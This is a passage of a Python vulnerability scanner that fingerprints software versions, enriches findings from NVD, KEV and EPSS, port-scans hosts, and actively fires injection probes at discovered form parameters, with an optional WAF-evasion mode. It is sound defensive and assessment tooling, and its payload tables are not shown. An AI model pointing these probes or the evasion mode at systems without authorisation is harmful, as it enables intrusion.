        "html": [r"jquery[.-]([\d.]+)(?:\.min)?\.js"],
    },
    "Bootstrap": {
        "vendor": "getbootstrap",
        "product": "bootstrap",
        "html": [r"bootstrap[/.\-]([\d.]+)(?:[/.\-]|\.min)?(?:js|css)"],
    },
    "WordPress": {
        "vendor": "wordpress",
        "product": "wordpress",
        "html": [r'<meta name="generator" content="WordPress ([\d.]+)'],
    },
    "Drupal": {
        "vendor": "drupal",
        "product": "drupal",
        "html": [r'<meta name="Generator" content="Drupal ([\d.]+)'],
    },
    "Joomla": {
        "vendor": "joomla",
        "product": "joomla",
        "html": [r'<meta name="generator" content="Joomla! ([\d.]+)'],
    },
    "Tomcat": {
        "vendor": "apache",
        "product": "tomcat",
        "html": [r"Apache Tomcat/([\d.]+)"],
    },
    "Jenkins": {
        "vendor": "jenkins",
        "product": "jenkins",
        "header": (r"X-Jenkins:\s*([\d.]+)", 1),
    },
    "GitLab": {
        "vendor": "gitlab",
        "product": "gitlab",
        "header": (r"X-Gitlab-Version:\s*([\d.]+)", 1),
    },
    "Grafana": {
        "vendor": "grafana",
        "product": "grafana",
        "header": (r"X-Grafana-Version:\s*([\d.]+)", 1),
    },
    "Elasticsearch": {
        "vendor": "elastic",
        "product": "elasticsearch",
        "html": [r'"number"\s*:\s*"([\d.]+)"'],
    },
    "OpenSSL": {
        "vendor": "openssl",
        "product": "openssl",
        "header": (r"OpenSSL/([\d.]+[a-z]?)", 1),
    },
}
BANNER_SIGS = {
    "OpenSSH": {
        "vendor": "openbsd",
        "product": "openssh",
        "patterns": [r"SSH-[\d.]+-OpenSSH_([\d.]+)"],
    },
    "vsFTPd": {
        "vendor": "vsftpd_project",
        "product": "vsftpd",
        "patterns": [r"vsFTPd\s+([\d.]+)"],
    },
    "ProFTPD": {
        "vendor": "proftpd",
        "product": "proftpd",
        "patterns": [r"ProFTPD\s+([\d.]+)"],
    },
    "Exim": {"vendor": "exim", "product": "exim", "patterns": [r"Exim\s+([\d.]+)"]},
    "Postfix": {
        "vendor": "postfix",
        "product": "postfix",
        "patterns": [r"Postfix\s+([\d.]+)"],
    },
    "MySQL": {
        "vendor": "oracle",
        "product": "mysql",
        "patterns": [r"([\d]+\.[\d]+\.[\d]+)-[\w.-]*MySQL"],
    },
    "MariaDB": {
        "vendor": "mariadb",
        "product": "mariadb",
        "patterns": [r"5\.[\d.]+-MariaDB"],
    },
    "PostgreSQL": {
        "vendor": "postgresql",
        "product": "postgresql",
        "patterns": [r"PostgreSQL\s+([\d.]+)"],
    },
    "Redis": {
        "vendor": "redis",
        "product": "redis",
        "patterns": [r"redis_version:([\d.]+)"],
    },
    "MongoDB": {
        "vendor": "mongodb",
        "product": "mongodb",
        "patterns": [r'"version"\s*:\s*"([\d.]+)"'],
    },
}


def fingerprint_http(url, sess):
    r = sess.get(url, timeout=20, allow_redirects=True)
    if r is None:
        return {}, []
    htxt = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
    body = r.text or ""
    detected = {}
    for name, sig in TECH_SIGS.items():
        ver = None
        if "header" in sig:
            pat, grp = sig["header"]
            m = re.search(pat, htxt, re.I)
            if m and m.lastindex:
                ver = m.group(grp)
        if not ver:
            for pat in sig.get("html", []):
                m = re.search(pat, body, re.I)
                if m and m.lastindex:
                    ver = m.group(1)
                    break
        if ver:
            detected[name] = ver
    pending = [
        (TECH_SIGS[name]["vendor"], TECH_SIGS[name]["product"], ver)
        for name, ver in detected.items()
    ]
    return detected, pending


def fingerprint_banner(banner):
    if not banner:
        return {}, []
    detected = {}
    for name, sig in BANNER_SIGS.items():
        for pat in sig["patterns"]:
            m = re.search(pat, banner, re.I)
            if m and m.lastindex:
                detected[name] = m.group(1)
                break
    pending = [
        (BANNER_SIGS[name]["vendor"], BANNER_SIGS[name]["product"], ver)
        for name, ver in detected.items()
    ]
    return detected, pending


NVD_API = "https://services.nvd.nist.gov/rest/json/cves/2.0"
KEV_URL = (
    "https://www.cisa.gov/sites/default/files/feeds/"
    "known_exploited_vulnerabilities.json"
)
EPSS_API = "https://api.first.org/data/v1/epss"


def _default_cache_dir():
    xdg = os.environ.get("XDG_CACHE_HOME")
    if xdg:
        return Path(xdg) / "cve_scanner"
    if sys.platform == "win32":
        local = os.environ.get("LOCALAPPDATA")
        if local:
            return Path(local) / "cve_scanner"
    return Path.home() / ".cache" / "cve_scanner"


CACHE_DIR = _default_cache_dir()
try:
    CACHE_DIR.mkdir(parents=True, exist_ok=True)
except OSError as _cache_err:
    err(f"Cache dir {CACHE_DIR} unavailable: {_cache_err}")
    CACHE_DIR = Path.cwd() / ".cve_scanner_cache"
    try:
        CACHE_DIR.mkdir(parents=True, exist_ok=True)
    except OSError as _cache_err2:
        err(f"Fallback cache dir unavailable: {_cache_err2} (caching disabled)")
        CACHE_DIR = None

_NVD_LOCK = threading.Lock()
_NVD_TIMES = []
_NVD_WINDOW = 30.0
_NVD_MAX_IN_WINDOW = 5


def _nvd_wait():
    while True:
        with _NVD_LOCK:
            now = time.monotonic()
            cutoff = now - _NVD_WINDOW
            while _NVD_TIMES and _NVD_TIMES[0] < cutoff:
                _NVD_TIMES.pop(0)
            if len(_NVD_TIMES) < _NVD_MAX_IN_WINDOW:
                _NVD_TIMES.append(now)
                return
            sleep_for = _NVD_TIMES[0] + _NVD_WINDOW - now + 0.05
        if sleep_for > 0:
            time.sleep(sleep_for)


def _load_cache(name, max_age=24):
    if CACHE_DIR is None:
        return None
    p = CACHE_DIR / f"{name}.json"
    if not p.exists():
        return None
    if (time.time() - p.stat().st_mtime) / 3600 > max_age:
        return None
    try:
        return json.loads(p.read_text(encoding="utf-8"))
    except Exception:
        return None


def _save_cache(name, data):
    if CACHE_DIR is None:
        return
    try:
        (CACHE_DIR / f"{name}.json").write_text(
            json.dumps(data), encoding="utf-8"
        )
    except Exception:
        pass


def fetch_kev():
    c = _load_cache("kev", 12)
    if c:
        return c
    try:
        data = get_json(KEV_URL)
        kev = {v["cveID"]: v for v in data.get("vulnerabilities", [])}
        _save_cache("kev", kev)
        return kev
    except Exception:
        return {}


def fetch_epss(cve_ids):
    if not cve_ids:
        return {}
    out = {}
    for i in range(0, len(cve_ids), 50):
        try:
            data = get_json(EPSS_API, params={"cve": ",".join(cve_ids[i : i + 50])})
            for it in data.get("data", []):
                out[it["cve"]] = float(it.get("epss", 0.0))
        except Exception:
            continue
    return out


def fetch_nvd_cve(cve_id, retry=0):
    cached = _load_cache(f"nvd-{cve_id}", 168)
    if cached is not None:
        return cached
    _nvd_wait()
    try:
        data = get_json(NVD_API, params={"cveId": cve_id})
        vs = data.get("vulnerabilities", [])
        entry = vs[0]["cve"] if vs else None
        if entry is not None:
            _save_cache(f"nvd-{cve_id}", entry)
        return entry
    except urllib.error.HTTPError as e:
        if e.code == 429 and retry < 3:
            time.sleep(30 * (2**retry))
            return fetch_nvd_cve(cve_id, retry + 1)
        return None
    except Exception:
        if retry < 3:
            time.sleep(2**retry)
            return fetch_nvd_cve(cve_id, retry + 1)
        return None


def fetch_nvd_cpe(vendor, product, version, retry=0):
    safe = re.sub(r"[^\w.-]+", "_", f"cpe-{vendor}-{product}-{version}")[:80]
    cached = _load_cache(safe, 168)
    if cached is not None:
        return cached
    _nvd_wait()
    try:
        data = get_json(
            NVD_API,
            params={
                "cpeName": (
                    f"cpe:2.3:a:{vendor}:{product}:{version}:*:*:*:*:*:*:*"
                ),
                "resultsPerPage": 50,
            },
        )
        _save_cache(safe, data)
        return data
    except urllib.error.HTTPError as e:
        if e.code == 429 and retry < 3:
            time.sleep(30 * (2**retry))
            return fetch_nvd_cpe(vendor, product, version, retry + 1)
        return {}
    except Exception:
        return {}


def extract_cvss(nvd):
    m = nvd.get("metrics", {})
    for k in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV40", "cvssMetricV2"):
        if k in m and m[k]:
            try:
                return float(m[k][0]["cvssData"]["baseScore"])
            except (KeyError, TypeError, ValueError):
                pass
    return None


def extract_cwe(nvd):
    out = []
    for w in nvd.get("weaknesses", []):
        for d in w.get("description", []):
            v = d.get("value", "")
            if v.startswith("CWE-") and v not in out:
                out.append(v)
    return out


def cpe_lookup(vendor, product, version):
    data = fetch_nvd_cpe(vendor, product, version)
    if not data:
        return []
    out = []
    for v in data.get("vulnerabilities", []):
        cve = v.get("cve", {})
        cid = cve.get("id")
        if not cid:
            continue
        matched = False
        for cfg in cve.get("configurations", []):
            for node in cfg.get("nodes", []):
                for m in node.get("cpeMatch", []):
                    if not m.get("vulnerable"):
                        continue
                    if f":{vendor}:{product}:" not in m.get("criteria", ""):
                        continue
                    si = m.get("versionStartIncluding")
                    se = m.get("versionStartExcluding")
                    ei = m.get("versionEndIncluding")
                    ee = m.get("versionEndExcluding")
                    if si or se or ei or ee:
                        if vrange(version, si, se, ei, ee):
                            matched = True
                    else:
                        parts = m["criteria"].split(":")
                        if len(parts) > 5 and parts[4] == version:
                            matched = True
                    if matched:
                        break
                if matched:
                    break
            if matched:
                break
        if not matched:
            continue
        cvss = extract_cvss(cve)
        cwes = extract_cwe(cve)
        descs = cve.get("descriptions") or [{}]
        out.append(
            {
                "cve_id": cid,
                "package": product,
                "version": version,
                "ecosystem": "CPE",
                "cwe": cwes,
                "cvss": cvss,
                "summary": (descs[0] or {}).get("value", "")[:300],
                "source": "CPE",
                "in_kev": False,
                "epss": 0.0,
                "priority": "HIGH" if (cvss or 0) >= 7.0 else "MEDIUM",
                "false_positive_status": "NEEDS_REVIEW",
                "false_positive_reason": f"Detected {vendor}/{product} {version}",
            }
        )
    return out


def assess_fp(f):
    v = f.get("verification")
    if v:
        s = v.get("status")
        fp = v.get("fp_status")
        if s == "CONFIRMED":
            return ("CONFIRMED", v.get("evidence", "Active PoC confirmed"))
        if s == "WAF_BLOCKED":
            return ("UNVERIFIED", v.get("evidence", "Blocked by WAF"))
        if s == "NOT_REPRODUCED":
            return (
                fp or "LIKELY_FALSE_POSITIVE",
                v.get("evidence", "PoC did not trigger"),
            )
    if f.get("source") in ("PortScan", "Banner", "HTTP"):
        return ("CONFIRMED", f.get("summary", "Observed on target"))
    if f.get("in_kev"):
        return ("CONFIRMED", "Listed in CISA KEV")
    cid = f.get("cve_id")
    if not cid:
        return ("LIKELY_FALSE_POSITIVE", "No CVE assigned")
    epss = f.get("epss", 0.0) or 0.0
    if epss >= 0.1:
        return ("LIKELY_REAL", f"High EPSS ({epss:.2%})")
    cvss = f.get("cvss")
    if cvss is not None and cvss >= 7.0:
        return ("LIKELY_REAL", f"High CVSS ({cvss})")
    if cvss is not None:
        return ("NEEDS_REVIEW", f"CVE assigned, CVSS {cvss}")
    return ("NEEDS_REVIEW", "CVE assigned, no CVSS/EPSS")


def enrich(findings):
    if not findings:
        return findings
    ids = sorted({f["cve_id"] for f in findings if f.get("cve_id")})
    info(f"Enriching {len(findings)} findings ({len(ids)} unique CVEs)...")
    epss_map = fetch_epss(ids)
    kev_map = fetch_kev()
    nvd_cache = {}
    if ids:
        with ThreadPoolExecutor(max_workers=4) as ex:
            for cid, entry in zip(ids, ex.map(fetch_nvd_cve, ids)):
                nvd_cache[cid] = entry
    for f in findings:
        cid = f.get("cve_id")
        epss = epss_map.get(cid, 0.0) if cid else 0.0
        in_kev = bool(cid and cid in kev_map)
        cvss, nvd_cwe = None, []
        entry = nvd_cache.get(cid) if cid else None
        if entry:
            cvss = extract_cvss(entry)
            nvd_cwe = extract_cwe(entry)
        merged = sorted(set((f.get("cwe") or []) + nvd_cwe))
        if in_kev:
            priority = "CRITICAL"
        elif epss >= 0.1:
            priority = "HIGH"
        elif cvss is not None and cvss >= 7.0:
            priority = "HIGH"
        elif cvss is not None and cvss >= 4.0:
            priority = "MEDIUM"
        elif cid:
            priority = "LOW"
        else:
            priority = "INFO"
        f.update(
            {
                "cwe": merged,
                "cvss": cvss,
                "epss": round(epss, 4),
                "in_kev": in_kev,
                "priority": priority,
            }
        )
        f["false_positive_status"], f["false_positive_reason"] = assess_fp(f)
    return findings


FORM_RE = re.compile(r"<form\b[^>]*>(.*?)</form>", re.I | re.S)
NAME_RE = re.compile(r"name=[\"']([^\"']+)", re.I)
ACT_RE = re.compile(r"action=[\"']?([^\"'\s>]+)", re.I)
METH_RE = re.compile(r"method=[\"']?([^\"'\s>]+)", re.I)


def injection_points(html, base_url):
    seen, pts = set(), []

    def add(u, m, ps):
        k = (u, m, tuple(sorted(ps)))
        if k not in seen:
            seen.add(k)
            pts.append({"url": u, "method": m, "params": ps})

    q = urllib.parse.urlparse(base_url).query
    if q:
        add(
            base_url,
            "GET",
            list(urllib.parse.parse_qs(q, keep_blank_values=True).keys()),
        )
    for fm in FORM_RE.finditer(html):
        outer = fm.group(0)
        inner = fm.group(1)
        a = ACT_RE.search(outer)
        m = METH_RE.search(outer)
        action = urljoin(base_url, a.group(1)) if a else base_url
        method = (m.group(1) if m else "GET").upper()
        ps = [n.group(1) for n in NAME_RE.finditer(inner)]
        if ps:
            add(action, method, ps)
    return pts


class RateLimiter:
    def __init__(self, rate=0.0, jitter=0.0):
        self.rate = rate
        self.jitter = jitter
        self._last = 0.0

    def wait(self):
        if self.rate <= 0:
            return
        gap = 1.0 / self.rate
        el = time.monotonic() - self._last
        if el < gap:
            time.sleep(gap - el)
        if self.jitter > 0:
            import random

            time.sleep(self.jitter * (0.5 + 0.5 * random.random()))
        self._last = time.monotonic()


def signal(exploit, baseline, payload, probe):
    if exploit is None or baseline is None:
        return False, "request failed"
    mode = probe["detect"]
    ex_txt = resp_blob(exploit)
    bl_txt = resp_blob(baseline)

    if mode == "xss_reflection":
        for m in probe.get("markers", []):
            if m in exploit.text and m not in baseline.text:
                return True, f"marker {m!r} reflected"
        hits = sig_match(exploit.text, XSS_SIGS, baseline.text)
        if hits:
            return True, f"XSS sigs: {hits}"
        return False, "no reflection"

    if mode in ("sql", "rce"):
        d = exploit.elapsed_seconds - baseline.elapsed_seconds
        if d >= probe.get("timing_threshold", 3.0):
            return True, f"timing delta {d:.1f}s"
        sigs = SQL_SIGS if mode == "sql" else RCE_SIGS
        hits = sig_match(ex_txt, sigs, bl_txt)
        if hits:
            return True, f"{mode.upper()} sigs: {hits}"
        return False, "no signal"

    if mode == "pattern":
        hits = sig_match(ex_txt, probe.get("signatures", {}), bl_txt)
        if hits:
            return True, f"signatures: {hits}"
        return False, "no signal"

    if mode == "ssti":
        e = probe.get("expected", "")
        if e and e in exploit.text and e not in baseline.text:
            return True, f"SSTI evaluated -> {e}"
        hits = sig_match(ex_txt, SSTI_SIGS, bl_txt)
        if hits:
            return True, f"SSTI sigs: {hits}"
        return False, "no signal"

    if mode == "redirect":
        loc = exploit.headers.get("Location", "")
        if probe.get("expected", "evil.example.com") in loc:
            return True, f"redirects to {loc}"
        hits = sig_match(ex_txt, REDIR_SIGS, bl_txt)
        if hits:
            return True, f"redirect sigs: {hits}"
        return False, "no redirect"
    return False, f"unknown mode {mode}"


def verify_cve(target_url, cve_id, sess, limiter):
    cve_id = cve_id.upper()
    probe = CVE_PROBES.get(cve_id)
    if not probe:
        return None
    baseline = sess.get(target_url, timeout=15, allow_redirects=False)
    if baseline is None:
        return {"status": "UNVERIFIED", "reason": "Cannot reach target"}
    bl_blob = resp_blob(baseline)
    blocks = 0
    for p in probe["probes"]:
        url = urljoin(target_url, p.get("path", "/"))
        limiter.wait()
        ex = sess.request(
            p.get("method", "GET"),
            url,
            data=p.get("data"),
            headers=p.get("headers"),
            json_body=p.get("json_body"),
        )
        if ex is None:
            continue
        if is_blocked(ex) and not is_blocked(baseline):
            if detect_waf(ex.status_code, ex.headers, ex.text):
                blocks += 1
                continue
        rs = p.get("require_status")
        if rs and ex.status_code not in rs:
            continue
        hits = sig_match(resp_blob(ex), p.get("sig", {}), bl_blob)
        if hits:
            return {
                "status": "CONFIRMED",
                "fp_status": "CONFIRMED",
                "method": f"{cve_id} {probe['label']}",
                "evidence": f"{url}: {hits}",
            }
    if blocks:
        return {
            "status": "WAF_BLOCKED",
            "fp_status": "UNVERIFIED",
            "method": f"{cve_id} {probe['label']}",
            "evidence": f"{blocks} request(s) blocked by WAF",
        }
    return {
        "status": "NOT_REPRODUCED",
        "fp_status": "NEEDS_REVIEW",
        "method": f"{cve_id} {probe['label']}",
        "evidence": f"Probes did not trigger ({len(probe['probes'])} endpoint(s))",
    }


def _send_pt(sess, pt, values, limiter, allow_redirects=False):
    limiter.wait()
    if pt["method"] == "GET":
        return sess.request(
            "GET", pt["url"], params=values, allow_redirects=allow_redirects
        )
    return sess.request(
        pt["method"], pt["url"], data=values, allow_redirects=allow_redirects
    )


def verify_cwe(target_url, cwe, sess, limiter, waf_bypass):
    probe = CWE_PROBES.get(cwe)
    if not probe:
        return None
    page = sess.get(target_url, timeout=15, allow_redirects=True)
    if page is None:
        return {"status": "UNVERIFIED", "reason": "Cannot fetch target"}
    pts = injection_points(page.text, target_url)
    if not pts:
        return {"status": "UNVERIFIED", "reason": "No parameters found"}
    info(
        f"    {probe['label']}: {len(pts)} point(s) x {len(probe['payloads'])} payload(s)"
    )
    baselines = {}

    def baseline_of(pt):
        k = (pt["url"], pt["method"], tuple(sorted(pt["params"])))
        if k not in baselines:
            baselines[k] = _send_pt(
                sess, pt, {p: "safe_test_123" for p in pt["params"]}, limiter
            )
        return baselines[k]

    blocks = 0
    for payload in probe["payloads"]:
        variants = obfuscate(payload) if waf_bypass else [payload]
        for variant in variants:
            for pt in pts:
                baseline = baseline_of(pt)
                ex = _send_pt(sess, pt, {p: variant for p in pt["params"]}, limiter)
                if ex and is_blocked(ex) and not is_blocked(baseline):
                    if detect_waf(ex.status_code, ex.headers, ex.text):
                        blocks += 1
                        continue
                vuln, why = signal(ex, baseline, variant, probe)
                if vuln:
                    return {
                        "status": "CONFIRMED",
                        "fp_status": "CONFIRMED",
                        "method": f"{probe['label']} PoC",
                        "evidence": (
                            f"{pt['url']} ({pt['method']}, "
                            f"params={pt['params']}): {why}"
                        ),
                    }
    if blocks:
        return {
            "status": "WAF_BLOCKED",
            "fp_status": "UNVERIFIED",
            "method": f"{probe['label']} PoC",
            "evidence": f"{blocks} request(s) blocked",
        }
    return {
        "status": "NOT_REPRODUCED",
        "fp_status": "LIKELY_FALSE_POSITIVE",
        "method": f"{probe['label']} PoC",
        "evidence": "Payloads did not trigger",
    }


def best_attempt(attempts):
    if not attempts:
        return None

    def k(a):
        s = a.get("status", "")
        fp = a.get("fp_status", "")
        if fp == "LIKELY_FALSE_POSITIVE":
            return 0
        if fp == "NEEDS_REVIEW":
            return 1
        if s == "WAF_BLOCKED":
            return 2
        if s == "NOT_REPRODUCED":
            return 3
        if s == "UNVERIFIED":
            return 4
        return 9

    return min(attempts, key=k)


def verify_findings(
    findings, target_url, sess, limiter, waf_bypass=False, skip_confirmed=False
):
    info(f"Verifying {len(findings)} findings against {target_url}")
    probe = sess.get(target_url, timeout=15, allow_redirects=True)
    if probe:
        waf = detect_waf(probe.status_code, probe.headers, probe.text)
        if waf:
            warn(f"WAF detected: {waf['vendor']}")
    processed = 0
    total = len(findings)
    for f in findings:
        if not f.get("cve_id") and not f.get("cwe"):
            continue
        if skip_confirmed and f.get("false_positive_status") == "CONFIRMED":
            continue
        processed += 1
        cve = (f.get("cve_id") or "").upper() or None
        cwe = (f.get("cwe") or [None])[0]
        info(f"[{processed}/{total}] {cve or f.get('package')} (CWE: {cwe or 'N/A'})")
        attempts, confirmed = [], None
        if cve and cve in CVE_PROBES:
            r = verify_cve(target_url, cve, sess, limiter)
            if r:
                attempts.append(r)
                if r["status"] == "CONFIRMED":
                    confirmed = r
        if not confirmed and cwe:
            r = verify_cwe(target_url, cwe, sess, limiter, waf_bypass)
            if r:
                attempts.append(r)
                if r["status"] == "CONFIRMED":
                    confirmed = r
        if confirmed:
            f["verification"] = confirmed
            confirm(cve or cwe, confirmed["method"], confirmed.get("evidence", ""))
        else:
            best = best_attempt(attempts)
            if best:
                f["verification"] = best
                info(f"    -> {best['status']}: {best.get('evidence', '')[:100]}")
            else:
                f["verification"] = {
                    "status": "UNVERIFIED",
                    "reason": "No PoC available",
                }
        if attempts:
            f["verification_attempts"] = [
                {
                    "method": a.get("method"),
                    "status": a.get("status"),
                    "fp_status": a.get("fp_status"),
                    "evidence": a.get("evidence", a.get("reason", "")),
                }
                for a in attempts
            ]
        time.sleep(0.5)
    for f in findings:
        f["false_positive_status"], f["false_positive_reason"] = assess_fp(f)
    return findings


def scan_target(target, sess):
    tgt(f"SCAN: {target}")
    findings = []
    pending_cpe = set()

    cands = normalize_target(target)
    info(f"Candidates: {cands}")
    working = detect_working_url(cands, sess)
    if working:
        url, st = working
        info(f"Working URL: {url} (HTTP {st})")
    else:
        url = None
        warn("No HTTP/HTTPS endpoint responded")
    host = extract_host(target)
    info(f"Host: {host}")

    open_ports = {}
    if AUTO_PORT_SCAN:
        step("Port scan")
        ports = CUSTOM_PORTS or COMMON_PORTS
        open_ports = port_scan(host, ports, PORT_SCAN_TIMEOUT, PORT_SCAN_WORKERS)
        if open_ports:
            info(f"Open: {sorted(open_ports.keys())}")
            for port, svc in sorted(open_ports.items()):
                finding("INFO", f"port-{port}", f"{svc} open")
                findings.append(
                    {
                        "package": f"port-{port}",
                        "version": "",
                        "ecosystem": "Network",
                        "source": "PortScan",
                        "summary": f"Port {port} open ({svc})",
                        "port": port,
                        "service": svc,
                        "cve_id": None,
                        "cwe": [],
                        "false_positive_status": "CONFIRMED",
                        "false_positive_reason": "TCP connect succeeded",
                        "priority": "INFO",
                    }
                )
        else:
            info("No common ports open")

    if AUTO_BANNER_GRAB and open_ports:
        step("Banner grab")
        for port in open_ports:
            b = auto_banner(host, port)
            if not b:
                continue
            info(f"Port {port}: {b[:100]!r}")
            det, pend = fingerprint_banner(b)
            for name, ver in det.items():
                finding("INFO", name, f"{ver} on port {port}")
                findings.append(
                    {
                        "package": name.lower(),
                        "version": ver,
                        "ecosystem": "Banner",
                        "source": "Banner",
                        "summary": f"{name} {ver} on port {port}",
                        "port": port,
                        "cve_id": None,
                        "cwe": [],
                        "false_positive_status": "CONFIRMED",
                        "false_positive_reason": (
                            f"Version from banner on port {port}"
                        ),
                        "priority": "INFO",
                    }
                )
            pending_cpe.update(pend)

    if url and AUTO_HTTP_FINGERPRINT:
        step("HTTP fingerprint")
        det, pend = fingerprint_http(url, sess)
        for name, ver in det.items():
            finding("INFO", name, f"{ver} via HTTP")
            findings.append(
                {
                    "package": name.lower(),
                    "version": ver,
                    "ecosystem": "HTTP",
                    "source": "HTTP",
                    "summary": f"{name} {ver} via HTTP headers",
                    "cve_id": None,
                    "cwe": [],
                    "false_positive_status": "CONFIRMED",
                    "false_positive_reason": "Version from HTTP response",
                    "priority": "INFO",
                }
            )
        pending_cpe.update(pend)

    if pending_cpe:
        step(f"CPE lookup ({len(pending_cpe)} unique)")
        for triple in pending_cpe:
            findings.extend(cpe_lookup(*triple))

    seen, dedup = set(), []
    for f in findings:
        k = (f.get("cve_id"), f.get("package"), f.get("port"))
        if k not in seen:
            seen.add(k)
            dedup.append(f)

    if dedup:
        step("Enrichment")
        dedup = enrich(dedup)
    if AUTO_PROBE and url:
        pt = [f for f in dedup if f.get("cve_id") or f.get("cwe")]
        if pt:
            step(f"PoC verification ({len(pt)} candidates)")
            dedup = verify_findings(
                dedup,
                url,
                sess,
                RateLimiter(PROBE_RATE, PROBE_JITTER),
                waf_bypass=PROBE_WAF_BYPASS,
            )
    return dedup


def save_json(fs, p):
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(json.dumps(fs, indent=2, ensure_ascii=False), encoding="utf-8")
    info(f"JSON saved: {p}")


def save_html(fs, p):
    p.parent.mkdir(parents=True, exist_ok=True)
    order = {
        "CRITICAL": 0,
        "HIGH": 1,
        "MEDIUM": 2,
        "LOW": 3,
        "INFO": 4,
        "UNKNOWN": 5,
    }
    esc = htmllib.escape
    rows = []
    for f in sorted(
        fs, key=lambda x: (order.get(x.get("priority"), 5), -(x.get("epss") or 0))
    ):
        cve = esc(f.get("cve_id") or f.get("package") or "\u2014")
        cwes = f.get("cwe") or []
        cwe_n = esc(cwe_name(cwes[0]) if cwes else "\u2014")
        cwe_l = esc(", ".join(cwes))
        prio = f.get("priority", "UNKNOWN")
        fp = f.get("false_positive_status", "UNKNOWN")
        reason = esc((f.get("false_positive_reason") or "")[:200])
        pkg = esc(str(f.get("package", "?")))
        ver = esc(str(f.get("version", "")))
        cvss = f.get("cvss")
        cvss_s = esc(str(cvss)) if cvss is not None else "-"
        color = {
            "CRITICAL": "#b71c1c",
            "HIGH": "#d84315",
            "MEDIUM": "#f57f17",
            "LOW": "#2e7d32",
            "INFO": "#1976d2",
        }.get(prio, "#555")
        fpc = {
            "CONFIRMED": "#b71c1c",
            "LIKELY_REAL": "#d84315",
            "NEEDS_REVIEW": "#f57f17",
            "LIKELY_FALSE_POSITIVE": "#2e7d32",
            "UNVERIFIED": "#555",
        }.get(fp, "#555")
        rows.append(
            f"<tr><td style='color:{color};font-weight:bold'>{esc(prio)}</td>"
            f"<td>{cve}<br><small>{cwe_n} {cwe_l}</small></td>"
            f"<td>{pkg} <small>{ver}</small></td>"
            f"<td>{cvss_s}</td>"
            f"<td>{(f.get('epss') or 0):.2%}</td>"
            f"<td>{'Yes' if f.get('in_kev') else 'No'}</td>"
            f"<td style='color:{fpc};font-weight:bold'>{esc(fp)}</td>"
            f"<td><small>{reason}</small></td></tr>"
        )
    html = f"""<!DOCTYPE html><html><head><meta charset="utf-8"><title>Scan Report</title>
<style>body{{font-family:system-ui,sans-serif;margin:20px;color:#222}}
h1{{border-bottom:2px solid #333;padding-bottom:8px}}
table{{border-collapse:collapse;width:100%;font-size:13px}}
th,td{{border:1px solid #ddd;padding:6px 8px;text-align:left;vertical-align:top}}
th{{background:#f4f4f4;position:sticky;top:0}}
tr:nth-child(even){{background:#fafafa}}small{{color:#666}}.meta{{color:#666;margin-bottom:16px}}
</style></head><body><h1>Scan Report</h1>
<div class="meta">{time.strftime("%Y-%m-%d %H:%M:%S")} \u00b7 {len(fs)} finding(s)</div>
<table><thead><tr><th>Priority</th><th>CVE / Type</th><th>Package</th><th>CVSS</th>
<th>EPSS</th><th>KEV</th><th>FP Status</th><th>Reason</th></tr></thead>
<tbody>{''.join(rows)}</tbody></table></body></html>"""
    p.write_text(html, encoding="utf-8")
    info(f"HTML saved: {p}")


def summary(fs):
    if not fs:
        info("No findings.")
        return
    order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    fs.sort(key=lambda f: (order.get(f.get("priority"), 5), -(f.get("epss") or 0)))
    bar = "\u2500" * 88
    LOG("\n" + bar)
    LOG("SUMMARY")
    LOG(bar)
    for f in fs:
        cve = f.get("cve_id") or f.get("package", "?")
        finding(f.get("priority", "UNKNOWN"), cve, (f.get("summary") or "")[:100])
        if f.get("false_positive_status") == "CONFIRMED":
            info(f"    \u2713 {f.get('false_positive_reason', '')[:150]}")
    counts = {}
    for f in fs:
        k = f.get("false_positive_status")
        counts[k] = counts.get(k, 0) + 1
    LOG("\n" + bar)
    for k in (
        "CONFIRMED",
        "LIKELY_REAL",
        "NEEDS_REVIEW",
        "LIKELY_FALSE_POSITIVE",
        "UNVERIFIED",
    ):
        if counts.get(k):
            LOG(f"  {k:<22}: {counts[k]}")
    LOG(f"  {'TOTAL':<22}: {len(fs)}")
    LOG(bar)


def main():
    global LOG
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    ts = time.strftime("%Y%m%d-%H%M%S")
    try:
        LOG.close()
    except Exception:
        pass
    LOG = Log(OUTPUT_DIR / f"scan-{ts}.log")
    bar = "\u2550" * 88
    LOG(
        f"\n{bar}\n"
        f"  CVE Scanner \u2014 Standalone (pure Python)\n"
        f"  Targets: {len(TARGETS)}\n"
        f"  Output:  {OUTPUT_DIR.absolute()}\n"
        f"{bar}"
    )
    sess = Session()
    all_f = []
    for i, target in enumerate(TARGETS, 1):
        try:
            LOG(f"\n[{i}/{len(TARGETS)}] Scanning {target}")
            all_f.extend(scan_target(target, sess))
        except KeyboardInterrupt:
            warn("Interrupted")
            break
        except Exception as e:
            err(f"Target failed: {e}")
            continue
    seen, final = set(), []
    for f in all_f:
        k = (f.get("cve_id"), f.get("package"), f.get("port"))
        if k not in seen:
            seen.add(k)
            final.append(f)
    summary(final)
    if SAVE_JSON:
        save_json(final, OUTPUT_DIR / f"findings-{ts}.json")
    if SAVE_HTML:
        save_html(final, OUTPUT_DIR / f"report-{ts}.html")
    LOG(
        f"\n{bar}\n"
        f"  DONE \u2014 {len(final)} finding(s) from {len(TARGETS)} target(s)\n"
        f"{bar}\n"
    )
    LOG.close()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nInterrupted by user.")
        sys.exit(130)
